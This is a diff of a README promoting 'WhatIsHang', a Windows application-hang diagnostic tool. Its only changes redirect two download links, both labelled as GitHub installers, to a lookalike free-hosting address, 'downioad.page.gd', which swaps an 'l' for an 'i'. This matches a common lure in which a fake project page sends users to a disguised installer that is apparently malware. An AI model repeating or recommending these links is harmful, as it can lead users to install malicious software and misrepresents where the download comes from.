@@ -2,7 +2,7 @@
 
 WhatIsHang is a powerful and lightweight diagnostic utility designed specifically for Windows 10 and Windows 11 systems. The tool provides deep analysis of application hangs, freeze events, and unresponsive program states that commonly plague desktop environments. By examining thread activities, call stacks, and system resource allocation, WhatIsHang delivers actionable insights into why applications stop responding. This 2026 release includes updated Windows API compatibility, improved stack trace resolution, and enhanced reporting capabilities.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -69,7 +69,7 @@ A: WhatIsHang includes built-in report generation accessible through the main in
 
 Get the latest version of WhatIsHang for your Windows system:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
